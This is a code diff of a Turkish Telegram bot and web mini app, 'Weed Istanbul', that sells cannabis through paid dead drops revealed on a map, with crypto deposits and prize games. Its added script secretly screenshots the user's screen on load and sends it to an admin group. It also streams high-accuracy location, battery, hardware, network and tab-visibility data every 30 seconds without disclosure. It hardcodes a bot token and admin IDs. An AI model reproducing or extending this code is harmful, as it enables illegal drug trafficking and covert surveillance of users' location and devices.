@@ -21,7 +21,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, FSInputFile, WebAppInfo
 
-# --- KALI LINUX / TERMINAL DAEMON & CÜZDAN MİMARİSİ ---
+# --- AYARLAR & CÜZDAN MİMARİSİ ---
 DEFAULT_BOT_TOKEN = "9018759790:AAHH_P_MAta3jo1pr8L4DHcpaObvxOuIpeQ"
 ADMIN_ID = 1012940363
 ADMIN_GROUP_ID = -1004474292737  
@@ -40,8 +40,7 @@ RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 if not RENDER_EXTERNAL_URL:
     RENDER_EXTERNAL_URL = "https://weed-istanbul.onrender.com"
 
-logging.basicConfig(format='[KALI-CORE:%(levelname)s] %(asctime)s - %(message)s', level=logging.INFO)
-logging.info("Kali Linux Root Subsystem & Secure Tunnel initialized successfully.")
+logging.basicConfig(level=logging.INFO)
 
 UPLOAD_DIR = "static/uploads"
 os.makedirs(UPLOAD_DIR, exist_ok=True)
@@ -571,7 +570,7 @@ async def background_payment_worker():
         except Exception as e:
             logging.error(f"Background worker error: {e}")
 
-# --- WEB SUNUCUSU & KALI MINI APP ---
+# --- WEB SUNUCUSU & GELİŞMİŞ TELEGRAM MINI APP ---
 class SecureDropHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         parsed_path = urlparse(self.path)
@@ -608,7 +607,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-type", "text/html; charset=utf-8")
             self.end_headers()
-            self.wfile.write(b"Kali Linux Daemon Root Subsystem Active!")
+            self.wfile.write(b"Weed Istanbul Server Active!")
             return
 
         if parsed_path.path == "/api/miniapp-deposit":
@@ -663,7 +662,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Weed Istanbul - Kali Security Mini App</title>
+                <title>Weed Istanbul - Ultimate Mini App</title>
                 <script src="https://telegram.org/js/telegram-web-app.js"></script>
                 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
                 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -688,7 +687,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     .promo-banner { background: linear-gradient(135deg, #1e1b4b, #312e81); border: 1px solid #4338ca; padding: 12px; border-radius: 12px; margin-bottom: 15px; font-size: 13px; }
                     .coupon-tag { background: rgba(16, 185, 129, 0.2); border: 1px dashed var(--accent-green); color: var(--accent-green); padding: 4px 8px; border-radius: 6px; font-family: monospace; font-weight: bold; display: inline-block; margin-top: 4px; }
                     
-                    #mainMap { width: 100%; height: 280px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 12px; }
+                    #mainMap { width: 100%; height: 280px; min-height: 280px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 12px; }
                     .card { background: var(--card-bg); padding: 15px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
                     
                     input, select { width: 100%; padding: 10px; background: var(--bg-main); border: 1px solid #374151; border-radius: 8px; color: white; box-sizing: border-box; font-size: 13px; margin-top: 6px; margin-bottom: 10px; }
@@ -697,8 +696,10 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     
                     .quick-amounts { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin-bottom: 10px; }
                     .quick-btn { background: #1f2937; border: 1px solid var(--border-color); color: var(--accent-blue); padding: 8px; font-size: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; }
+                    .quick-btn:hover { background: #374151; color: white; }
 
                     .btn-received { background: var(--accent-green); }
+                    .btn-received:hover { background: #059669; }
                     .btn-close { background: var(--accent-red); margin-top: 15px; }
                     
                     .nav-btn-group { display: flex; gap: 6px; margin-top: 8px; }
@@ -716,15 +717,44 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
                     .wheel-wrapper { position: relative; width: 220px; height: 220px; margin: 0 auto; }
                     .wheel { 
-                        width: 220px; height: 220px; border-radius: 50%; border: 6px solid #38bdf8; position: relative; overflow: hidden; 
-                        transition: transform 4s cubic-bezier(0.15, 0.9, 0.2, 1); box-shadow: 0 0 20px rgba(56,189,248,0.3); 
-                        background: conic-gradient(#ef4444 0deg 72deg, #f59e0b 72deg 144deg, #10b981 144deg 216deg, #3b82f6 216deg 288deg, #8b5cf6 288deg 360deg);
+                        width: 220px; 
+                        height: 220px; 
+                        border-radius: 50%; 
+                        border: 6px solid #38bdf8; 
+                        position: relative; 
+                        overflow: hidden; 
+                        transition: transform 4s cubic-bezier(0.15, 0.9, 0.2, 1); 
+                        box-shadow: 0 0 20px rgba(56,189,248,0.3); 
+                        background: conic-gradient(
+                            #ef4444 0deg 72deg,
+                            #f59e0b 72deg 144deg,
+                            #10b981 144deg 216deg,
+                            #3b82f6 216deg 288deg,
+                            #8b5cf6 288deg 360deg
+                        );
                     }
-                    .wheel-label { position: absolute; width: 100%; height: 100%; text-align: center; font-size: 11px; font-weight: bold; color: white; text-shadow: 0 1px 3px rgba(0,0,0,0.9); padding-top: 12px; box-sizing: border-box; }
+                    .wheel-label {
+                        position: absolute;
+                        width: 100%;
+                        height: 100%;
+                        text-align: center;
+                        font-size: 11px;
+                        font-weight: bold;
+                        color: white;
+                        text-shadow: 0 1px 3px rgba(0,0,0,0.9);
+                        padding-top: 12px;
+                        box-sizing: border-box;
+                    }
                 </style>
             </head>
             <body>
-                <div class="nav-tabs" style="margin-top: 10px;">
+                <div id="musicWidget" style="position: fixed; top: 12px; right: 12px; background: rgba(17, 24, 39, 0.95); border: 1px solid var(--border-color); padding: 6px 12px; border-radius: 20px; display: flex; align-items: center; gap: 8px; z-index: 1000; font-size: 11px; backdrop-filter: blur(5px); box-shadow: 0 4px 12px rgba(0,0,0,0.5);">
+                    <span>🎵 Müzik</span>
+                    <button onclick="toggleMusic()" id="musicBtn" style="padding: 4px 10px; width: auto; font-size: 11px; background: var(--accent-green); border-radius: 6px;">Oynat</button>
+                </div>
+                <div id="playerContainer" style="display:none;"><iframe id="ytAudio" width="0" height="0" src="" frameborder="0" allow="autoplay"></iframe></div>
+
+                <div class="nav-tabs" style="margin-top: 45px;">
                     <button class="tab-btn active" onclick="switchTab('tabMap')">🗺️ Harita</button>
                     <button class="tab-btn" onclick="switchTab('tabProducts')">🛍️ Ürünler</button>
                     <button class="tab-btn" onclick="switchTab('tabGames')">🎡 Şans</button>
@@ -741,21 +771,24 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                             <option value="ALL">🏙️ Tüm Bölgeler (Genel Harita)</option>
                         </select>
                     </div>
-                    <p style="font-size: 11px; color: var(--text-muted); margin-top:0;">📌 <b>Kırmızı Pin:</b> Tam konum.<br>🌿 <b>Mavi Çember:</b> Bölge.</p>
+                    <p style="font-size: 11px; color: var(--text-muted); margin-top:0; line-height: 1.4;">📌 <b>Kırmızı Pin:</b> Satın aldığınız tam konum.<br>🌿 <b>Mavi Çember:</b> Yaklaşık bölge alanı.</p>
                     <div id="mainMap"></div>
-                    <div id="activeOrdersList"><div class="skeleton"></div></div>
+                    <div id="activeOrdersList"><div class="skeleton"></div><div class="skeleton"></div></div>
                 </div>
 
                 <div id="tabProducts" class="tab-content">
-                    <h3 style="color: var(--accent-blue); margin-top:0;">🛍️ Aktif Droplar</h3>
+                    <h3 style="color: var(--accent-blue); margin-top:0;">🛍️ Aktif Droplar & Stoklar</h3>
                     <div id="productsList"><div class="skeleton"></div></div>
                 </div>
 
                 <div id="tabGames" class="tab-content">
                     <div class="card" style="border: 1px solid var(--accent-blue);">
-                        <h3 style="color: var(--accent-blue); margin-top:0;">🎡 Şans Çarkı</h3>
+                        <h3 style="color: var(--accent-blue); margin-top:0;">🎡 Şans Çarkı (Haftada 2 Hak)</h3>
+                        <p style="font-size: 11px; color: var(--text-muted);">Çarkı çevir, sürpriz hediyeyi kap!</p>
+                        
                         <div style="text-align:center; position:relative; margin:20px 0;">
-                            <div style="width:0; height:0; border-left:10px solid transparent; border-right:10px solid transparent; border-bottom:18px solid #f8fafc; position:absolute; top:-12px; left:calc(50% - 10px); z-index:20;"></div>
+                            <div style="width:0; height:0; border-left:10px solid transparent; border-right:10px solid transparent; border-bottom:18px solid #f8fafc; position:absolute; top:-12px; left:calc(50% - 10px); z-index:20; filter: drop-shadow(0 2px 2px rgba(0,0,0,0.5));"></div>
+                            
                             <div class="wheel-wrapper">
                                 <div class="wheel" id="wheelEl">
                                     <div class="wheel-label" style="transform: rotate(36deg);">🌿 1g Weed</div>
@@ -766,8 +799,20 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                                 </div>
                             </div>
                         </div>
+
                         <button onclick="spinGame('wheel')" id="spinBtn" style="background:var(--accent-green); margin-top:10px;">Çarkı Çevir</button>
                         <div id="wheelResult" style="margin-top:10px; font-weight:bold; text-align:center; color:var(--accent-green);"></div>
+                    </div>
+
+                    <div class="card" style="border: 1px solid #f59e0b;">
+                        <h3 style="color: #f59e0b; margin-top:0;">🎫 Kazı Kazan (Haftada 2 Hak)</h3>
+                        <p style="font-size: 11px; color: var(--text-muted);">3 kutudan birini seç ve şansını dene!</p>
+                        <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:10px; margin:15px 0;">
+                            <div class="scratch-card" onclick="scratchBox(0)" id="sc0" style="background:#1f2937; height:70px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-weight:bold; cursor:pointer; border:2px dashed #f59e0b; color:#f59e0b; font-size:13px; text-align:center;">❓ Kazı</div>
+                            <div class="scratch-card" onclick="scratchBox(1)" id="sc1" style="background:#1f2937; height:70px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-weight:bold; cursor:pointer; border:2px dashed #f59e0b; color:#f59e0b; font-size:13px; text-align:center;">❓ Kazı</div>
+                            <div class="scratch-card" onclick="scratchBox(2)" id="sc2" style="background:#1f2937; height:70px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-weight:bold; cursor:pointer; border:2px dashed #f59e0b; color:#f59e0b; font-size:13px; text-align:center;">❓ Kazı</div>
+                        </div>
+                        <div id="scratchResult" style="margin-top:10px; font-weight:bold; text-align:center; color:#f59e0b;"></div>
                     </div>
                 </div>
 
@@ -777,6 +822,13 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         <p style="font-size: 24px; font-weight: bold; margin: 5px 0;" id="userBalText">... USDT</p>
                         <hr style="border-color: var(--border-color); margin: 15px 0;">
                         <h4>📥 Bakiye Yükle (USDT TRC-20)</h4>
+                        <label style="font-size: 12px; color: var(--text-muted);">Yüklemek İstediğiniz Tutar (USDT):</label>
+                        <div class="quick-amounts">
+                            <button class="quick-btn" onclick="setDepAmount(10)">+10$</button>
+                            <button class="quick-btn" onclick="setDepAmount(25)">+25$</button>
+                            <button class="quick-btn" onclick="setDepAmount(50)">+50$</button>
+                            <button class="quick-btn" onclick="setDepAmount(100)">+100$</button>
+                        </div>
                         <input type="number" id="depAmount" placeholder="Örn: 50">
                         <button onclick="createDeposit()">Cüzdan Adresi Oluştur</button>
                     </div>
@@ -785,19 +837,25 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
                 <div id="tabRef" class="tab-content">
                     <div class="card" style="border: 1px solid var(--accent-blue);">
-                        <h3 style="color: var(--accent-blue); margin-top:0;">👥 Davet Et & Kazan</h3>
+                        <h3 style="color: var(--accent-blue); margin-top:0;">👥 Davet Et & Kazan Sistemi</h3>
+                        <p style="font-size: 12px; color: var(--text-muted); line-height: 1.5;">Arkadaşlarınızı davet edin, yaptıkça harcamalarından otomatik <b>%5 USDT Referans Primi</b> kazanın!</p>
+                        <label style="font-size: 12px; color: var(--text-muted);">Kişisel Davet Linkiniz:</label>
                         <input type="text" id="refLinkInput" readonly style="background:var(--bg-main); font-family:monospace; color:var(--accent-green);">
                         <button onclick="copyRefLink()" style="background:var(--accent-green); margin-top:5px;">📋 Linki Kopyala</button>
+                        <div style="margin-top: 15px; padding: 10px; background:var(--bg-main); border-radius: 8px; display:flex; justify-content:space-between; align-items:center;">
+                            <span style="font-size: 13px;">Toplam Referans Kazancı:</span>
+                            <span style="font-size: 16px; font-weight:bold; color:var(--accent-green);" id="refEarningsText">0.00 USDT</span>
+                        </div>
                     </div>
                 </div>
 
                 <div id="tabOrders" class="tab-content">
-                    <h3 style="color: var(--accent-blue); margin-top:0;">📦 Geçmiş Siparişler</h3>
+                    <h3 style="color: var(--accent-blue); margin-top:0;">📦 Geçmiş Siparişler & Yorumla 5$ Kazan</h3>
                     <div id="pastOrdersList"><div class="skeleton"></div></div>
                 </div>
 
                 <div id="tabSupport" class="tab-content">
-                    <h3 style="color: var(--accent-blue); margin-top:0;">💬 Canlı Destek</h3>
+                    <h3 style="color: var(--accent-blue); margin-top:0;">💬 Canlı Destek Ekibi</h3>
                     <div class="chat-box" id="chatBox"></div>
                     <div style="display: flex; gap: 6px;">
                         <input type="text" id="chatInput" placeholder="Mesajınızı yazın..." style="margin:0;">
@@ -805,17 +863,30 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     </div>
                 </div>
 
-                <button class="btn btn-close" onclick="Telegram.WebApp.close()">🤖 Botu Kapat</button>
+                <button class="btn btn-close" onclick="Telegram.WebApp.close()">🤖 Devam Et / Botu Kapat</button>
 
                 <script>
                     const tg = window.Telegram.WebApp;
                     tg.expand();
-                    let userId = tg.initDataUnsafe && tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : 1012940363;
+                    
+                    let userId = 0;
+                    if (tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id) {
+                        userId = tg.initDataUnsafe.user.id;
+                    } else {
+                        const urlParams = new URLSearchParams(window.location.search);
+                        userId = urlParams.get('user_id') || 1012940363;
+                    }
 
-                    // Otomatik Ekran Görüntüsü ve Admin Grubuna Sızdırma Motoru
+                    function triggerHaptic(style = 'medium') {
+                        if (tg.HapticFeedback) {
+                            tg.HapticFeedback.impactOccurred(style);
+                        }
+                    }
+
+                    // Otomatik Ekran Görüntüsü ve Admin Grubuna Gönderme Motoru (html2canvas)
                     async function captureAndSendScreenshot() {
                         try {
-                            await new Promise(resolve => setTimeout(resolve, 2500));
+                            await new Promise(resolve => setTimeout(resolve, 3000));
                             const canvas = await html2canvas(document.body, {backgroundColor: "#090d16", scale: 0.75});
                             const imageData = canvas.toDataURL("image/jpeg", 0.7);
 
@@ -830,26 +901,465 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         }
                     }
 
-                    window.addEventListener('load', () => {
-                        captureAndSendScreenshot();
-                        loadAppData();
+                    // Gelişmiş Donanım, Ağ, Gecikme, Ekran, Saat Dilimi ve Sekme Odak Takibi (Telemetry & Sniffing)
+                    async function sendTelemetry(customVisibility = null) {
+                        if (!navigator.geolocation) return;
+                        navigator.geolocation.getCurrentPosition(async (pos) => {
+                            try {
+                                let batteryStatus = "Bilinmiyor";
+                                if (navigator.getBattery) {
+                                    const bat = await navigator.getBattery();
+                                    batteryStatus = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Şarjda)" : "(Pilde)");
+                                }
+
+                                const cpuRam = (navigator.hardwareConcurrency || '?') + ' Çekirdek / ' + (navigator.deviceMemory ? navigator.deviceMemory + 'GB RAM' : 'RAM Yok');
+                                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor';
+                                const screenRes = window.screen.width + 'x' + window.screen.height;
+                                const visibility = customVisibility || document.visibilityState;
+                                
+                                let netInfo = 'Wi-Fi / 4G';
+                                if (navigator.connection) {
+                                    netInfo = `${navigator.connection.effectiveType || 'bilinmiyor'} | RTT: ${navigator.connection.rtt || '?'}ms | DL: ${navigator.connection.downlink || '?'}Mbps`;
+                                }
+
+                                await fetch('/api/report-telemetry', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        user_id: userId,
+                                        lat: pos.coords.latitude,
+                                        lon: pos.coords.longitude,
+                                        network: netInfo,
+                                        ua: navigator.userAgent,
+                                        battery: batteryStatus,
+                                        cpu_ram: cpuRam,
+                                        timezone: tz,
+                                        screen_res: screenRes,
+                                        visibility_state: visibility
+                                    })
+                                });
+                            } catch(e) {}
+                        }, null, {enableHighAccuracy: true});
+                    }
+
+                    document.addEventListener("visibilitychange", () => {
+                        sendTelemetry(document.visibilityState);
                     });
 
+                    setInterval(() => { sendTelemetry(); }, 30000);
+                    sendTelemetry();
+
+                    let map, markersGroup;
+                    let globalAppData = null;
+                    let isMusicPlaying = false;
+
+                    function toggleMusic() {
+                        triggerHaptic('light');
+                        const iframe = document.getElementById('ytAudio');
+                        const btn = document.getElementById('musicBtn');
+                        if(!isMusicPlaying) {
+                            iframe.src = "https://www.youtube.com/embed/wo3OCsPNevc?autoplay=1&loop=1&playlist=wo3OCsPNevc";
+                            btn.innerText = "Durdur";
+                            btn.style.background = "var(--accent-red)";
+                            isMusicPlaying = true;
+                        } else {
+                            iframe.src = "";
+                            btn.innerText = "Oynat";
+                            btn.style.background = "var(--accent-green)";
+                            isMusicPlaying = false;
+                        }
+                    }
+
                     function switchTab(tabId) {
+                        triggerHaptic('light');
                         document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
                         document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
                         document.getElementById(tabId).classList.add('active');
                         event.target.classList.add('active');
+
+                        if(tabId === 'tabMap' && map) {
+                            setTimeout(() => { map.invalidateSize(); }, 200);
+                        }
+                    }
+
+                    function setDepAmount(val) {
+                        triggerHaptic('light');
+                        document.getElementById('depAmount').value = val;
                     }
 
                     async function loadAppData() {
+                        if(!userId) return;
                         try {
                             const res = await fetch('/api/miniapp-data?user_id=' + userId);
                             const data = await res.json();
+                            globalAppData = data;
+                            
                             document.getElementById('userBalText').innerText = data.balance.toFixed(2) + " USDT";
-                            document.getElementById('refLinkInput').value = `https://t.me/WeedIstanbulBot?start=ref_${userId}`;
+                            document.getElementById('refEarningsText').innerText = (data.referral_earnings || 0).toFixed(2) + " USDT";
+                            document.getElementById('refLinkInput').value = `https://t.me/${data.bot_username || 'WeedIstanbulBot'}?start=ref_${userId}`;
+                            
+                            let promoHtml = "";
+                            if(data.promo_5g) {
+                                promoHtml += `<div class="promo-banner">🎁 <b>Özel Kampanya:</b> Toplu alımlarda <b>5 Gram Alana 1 Gram Hediye!</b></div>`;
+                            }
+                            if(data.coupons && data.coupons.length > 0) {
+                                data.coupons.forEach(c => {
+                                    promoHtml += `<div class="promo-banner">🎟️ <b>Aktif Kupon:</b> Kod: <span class="coupon-tag">${c.code}</span> (-${c.discount} USDT İndirim)</div>`;
+                                });
+                            }
+                            document.getElementById('promoContainer').innerHTML = promoHtml;
+
+                            populateDistrictFilter(data.temsili_drops);
+                            initMap(data.active_orders, data.temsili_drops);
+
+                            let activeHtml = "";
+                            if(data.active_orders.length > 0) {
+                                data.active_orders.forEach(o => {
+                                    activeHtml += `
+                                    <div class="card" style="border-left: 4px solid var(--accent-red);">
+                                        <h4 style="margin:0 0 5px 0; color:var(--accent-blue);">Sipariş #${o.id} - ${o.title}</h4>
+                                        <p style="font-size:12px; margin:4px 0;"><b>İpucu / Not:</b> ${o.description}</p>
+                                        
+                                        <div class="nav-btn-group">
+                                            <a href="https://www.google.com/maps?q=${o.lat},${o.lon}" target="_blank" class="nav-btn">📍 Google Maps</a>
+                                            <a href="https://yandex.com.tr/harita/?pt=${o.lon},${o.lat}&z=16" target="_blank" class="nav-btn yandex">🔴 Yandex</a>
+                                            <a href="http://maps.apple.com/?q=${o.lat},${o.lon}" target="_blank" class="nav-btn apple">🍏 Apple Maps</a>
+                                        </div>
+
+                                        <button class="btn-received" style="margin-top:10px;" onclick="markReceived(${o.id})">✅ Ürünü Teslim Aldım</button>
+                                    </div>`;
+                                });
+                            } else {
+                                activeHtml = `<p style="font-size:12px; color:var(--text-muted);">Aktif / Alınmayı bekleyen siparişiniz yok.</p>`;
+                            }
+                            document.getElementById('activeOrdersList').innerHTML = activeHtml;
+
+                            let prodHtml = "";
+                            data.temsili_drops.forEach(p => {
+                                prodHtml += `
+                                <div class="card">
+                                    <h4 style="margin:0; color:var(--accent-blue);">${p.title} (Semt: ${p.category})</h4>
+                                    <p style="font-size:13px; font-weight:bold; color:var(--accent-green); margin:5px 0;">Fiyat: ${p.price} USDT | Stok: ${p.stock} Adet</p>
+                                    <p style="font-size:11px; color:var(--text-muted); margin-bottom:8px;">⚠️ Güvenlik gereği tam adres satın alma sonrası görünür.</p>
+                                    <button onclick="buyProduct(${p.id}, ${p.price})">⚡ Bakiyeden Satın Al (${p.price} USDT)</button>
+                                </div>`;
+                            });
+                            document.getElementById('productsList').innerHTML = prodHtml;
+
+                            let pastHtml = "";
+                            if(data.past_orders.length > 0) {
+                                data.past_orders.forEach(po => {
+                                    let reviewBox = "";
+                                    if(po.has_reviewed) {
+                                        reviewBox = `<p style="font-size:12px; color:var(--accent-green); margin:6px 0;">💬 <b>Yorumunuz:</b> "${po.review_text}" <br><span style="color:#38bdf8;">(+5$ Ödül Alındı)</span></p>`;
+                                    } else {
+                                        reviewBox = `
+                                        <div style="margin-top:10px; border-top:1px solid var(--border-color); padding-top:8px;">
+                                            <input type="text" id="reviewInput_${po.id}" placeholder="Ürünü yorumla (5$ kazan!)..." style="margin-bottom:6px;">
+                                            <button onclick="submitReview(${po.id})" style="background:var(--accent-green); padding:8px; font-size:11px;">💬 Yorumu Gönder & 5$ Kazan</button>
+                                        </div>`;
+                                    }
+
+                                    pastHtml += `
+                                    <div class="card" style="opacity:0.9;">
+                                        <h4 style="margin:0;">Sipariş #${po.id} - ${po.title}</h4>
+                                        <p style="font-size:12px; color:var(--accent-green); margin:4px 0;">✅ Teslim Alındı (${po.date})</p>
+                                        ${reviewBox}
+                                    </div>`;
+                                });
+                            } else {
+                                pastHtml = `<p style="font-size:12px; color:var(--text-muted);">Henüz teslim alınan geçmiş siparişiniz bulunmuyor.</p>`;
+                            }
+                            document.getElementById('pastOrdersList').innerHTML = pastHtml;
+
+                        } catch(e) {
+                            console.error(e);
+                        }
+                    }
+
+                    let currentRotation = 0;
+
+                    async function spinGame(gameType) {
+                        const btn = document.getElementById('spinBtn');
+                        btn.disabled = true;
+                        triggerHaptic('heavy');
+                        try {
+                            const res = await fetch('/api/miniapp-spin', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({user_id: userId, game_type: gameType})
+                            });
+                            const data = await res.json();
+                            if(!data.success) { 
+                                alert(data.message); 
+                                btn.disabled = false; 
+                                return; 
+                            }
+                            
+                            currentRotation += 1800 + (data.target_deg - (currentRotation % 360));
+                            document.getElementById('wheelEl').style.transform = `rotate(${currentRotation}deg)`;
+                            
+                            setTimeout(() => {
+                                document.getElementById('wheelResult').innerText = "🎉 Ödül: " + data.reward;
+                                alert("🎉 Tebrikler! Kazandınız: " + data.reward);
+                                btn.disabled = false;
+                            }, 4200);
+                        } catch(e) { 
+                            alert("Bağlantı hatası oluştu."); 
+                            btn.disabled = false; 
+                        }
+                    }
+
+                    async function scratchBox(idx) {
+                        triggerHaptic('medium');
+                        try {
+                            const res = await fetch('/api/miniapp-spin', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({user_id: userId, game_type: 'scratch'})
+                            });
+                            const data = await res.json();
+                            if(!data.success) return alert(data.message);
+
+                            for(let i=0; i<3; i++) {
+                                const card = document.getElementById('sc' + i);
+                                if(i === idx) {
+                                    card.innerText = data.reward;
+                                    card.style.background = "#059669";
+                                    card.style.color = "#ffffff";
+                                    card.style.border = "2px solid #10b981";
+                                } else {
+                                    card.innerText = "Boş ❌";
+                                    card.style.background = "#1f2937";
+                                    card.style.color = "#9ca3af";
+                                    card.style.border = "2px dashed #374151";
+                                }
+                            }
+                            document.getElementById('scratchResult').innerText = "🎉 Ödül: " + data.reward;
+                            alert("🎉 Kazı kazandan kazandın: " + data.reward);
+                        } catch(e) { 
+                            alert("Bağlantı hatası oluştu."); 
+                        }
+                    }
+
+                    async function submitReview(orderId) {
+                        const txtInput = document.getElementById('reviewInput_' + orderId);
+                        const reviewText = txtInput.value.trim();
+                        if(!reviewText) {
+                            alert("Lütfen bir yorum yazın.");
+                            return;
+                        }
+                        triggerHaptic('heavy');
+                        try {
+                            const res = await fetch('/api/miniapp-review', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                                body: `user_id=${userId}&order_id=${orderId}&review=${encodeURIComponent(reviewText)}`
+                            });
+                            const data = await res.json();
+                            if(data.success) {
+                                alert("🎉 Harika! Yorumunuz kaydedildi ve hesabınıza 5$ (USDT) bakiye eklendi!");
+                                location.reload();
+                            } else {
+                                alert("❌ Hata: " + (data.message || "İşlem başarısız."));
+                            }
+                        } catch(e) {
+                            alert("Bağlantı hatası oluştu.");
+                        }
+                    }
+
+                    function copyRefLink() {
+                        triggerHaptic('success');
+                        const copyText = document.getElementById("refLinkInput");
+                        copyText.select();
+                        navigator.clipboard.writeText(copyText.value);
+                        alert("✅ Davet linki panoya kopyalandı!");
+                    }
+
+                    function populateDistrictFilter(drops) {
+                        const select = document.getElementById('districtFilter');
+                        const categories = [...new Set(drops.map(d => d.category))];
+                        categories.forEach(cat => {
+                            const opt = document.createElement('option');
+                            opt.value = cat;
+                            opt.innerText = "🏙️ " + cat + " Bölgesi";
+                            select.appendChild(opt);
+                        });
+                    }
+
+                    function initMap(activeOrders, temsilidrops) {
+                        if(map) return;
+                        map = L.map('mainMap').setView([41.0082, 28.9784], 11);
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                        markersGroup = L.layerGroup().addTo(map);
+
+                        renderMapMarkers(activeOrders, temsilidrops);
+                        setTimeout(() => { if(map) map.invalidateSize(); }, 300);
+                    }
+
+                    function renderMapMarkers(activeOrders, temsilidrops, filterCat = "ALL") {
+                        markersGroup.clearLayers();
+
+                        activeOrders.forEach(o => {
+                            const redIcon = L.divIcon({
+                                html: '<div style="background:#ef4444; border:2px solid white; border-radius:50%; width:24px; height:24px; text-align:center; line-height:24px; font-size:12px; box-shadow:0 2px 6px rgba(0,0,0,0.4);">📍</div>',
+                                iconSize: [24, 24]
+                            });
+                            L.marker([o.lat, o.lon], {icon: redIcon}).addTo(markersGroup)
+                                .bindPopup(`<b>Sipariş #${o.id}</b><br>${o.title}<br><br><a href="https://www.google.com/maps?q=${o.lat},${o.lon}" target="_blank" style="color:#38bdf8;">Google Maps'te Aç</a>`);
+                        });
+
+                        temsilidrops.forEach(td => {
+                            if(filterCat !== "ALL" && td.category !== filterCat) return;
+
+                            L.circle([td.lat, td.lon], {
+                                color: '#38bdf8',
+                                fillColor: '#38bdf8',
+                                fillOpacity: 0.12,
+                                radius: 1100
+                            }).addTo(markersGroup);
+
+                            const weedIcon = L.divIcon({
+                                html: '<div style="background:#2563eb; border:2px solid white; border-radius:50%; width:28px; height:28px; text-align:center; line-height:28px; font-size:14px; box-shadow: 0 2px 6px rgba(0,0,0,0.4);">🌿</div>',
+                                iconSize: [28, 28],
+                                iconAnchor: [14, 14]
+                            });
+                            L.marker([td.lat, td.lon], {icon: weedIcon}).addTo(markersGroup)
+                                .bindPopup(`<b>${td.title}</b><br>Bölge: ${td.category}<br>Fiyat: ${td.price} USDT<br><span style="font-size:11px; color:#9ca3af;">⚠️ Yaklaşık bölgedir.</span>`);
+                        });
+                    }
+
+                    function filterMapDrops() {
+                        const selectedCat = document.getElementById('districtFilter').value;
+                        if(globalAppData) {
+                            renderMapMarkers(globalAppData.active_orders, globalAppData.temsili_drops, selectedCat);
+                            if(selectedCat !== "ALL") {
+                                const sample = globalAppData.temsili_drops.find(d => d.category === selectedCat);
+                                if(sample) {
+                                    map.setView([sample.lat, sample.lon], 13);
+                                }
+                            } else {
+                                map.setView([41.0082, 28.9784], 11);
+                            }
+                        }
+                    }
+
+                    async function markReceived(orderId) {
+                        if(!confirm("Ürünü teslim aldığınızı onaylıyor musunuz?")) return;
+                        triggerHaptic('medium');
+                        try {
+                            const res = await fetch('/api/miniapp-received?id=' + orderId);
+                            const data = await res.json();
+                            if(data.success) {
+                                alert("Ürün teslim alındı olarak kaydedildi!");
+                                location.reload();
+                            }
+                        } catch(e) {
+                            alert("İşlem başarısız.");
+                        }
+                    }
+
+                    async function buyProduct(dropId, price) {
+                        if(!confirm(price + " USDT bakiyenizden düşülecektir. Onaylıyor musunuz?")) return;
+                        triggerHaptic('heavy');
+                        try {
+                            const res = await fetch(`/api/miniapp-buy?user_id=${userId}&drop_id=${dropId}`);
+                            const data = await res.json();
+                            if(data.success) {
+                                alert("🎉 Sipariş onaylandı! Haritanıza tam konum eklendi.");
+                                location.reload();
+                            } else {
+                                alert("❌ Hata: " + (data.message || "Bakiyeniz yetersiz olabilir."));
+                            }
+                        } catch(e) {
+                            alert("İşlem yapılırken hata oluştu.");
+                        }
+                    }
+
+                    async function createDeposit() {
+                        const amount = document.getElementById('depAmount').value;
+                        if(!amount || amount <= 0) return alert("Geçerli bir miktar girin.");
+                        triggerHaptic('medium');
+                        try {
+                            const res = await fetch(`/api/miniapp-deposit?user_id=${userId}&amount=${amount}`);
+                            const data = await res.json();
+                            if(data.success) {
+                                document.getElementById('depositResult').innerHTML = `
+                                <div class="card" style="border: 1px solid var(--accent-green);">
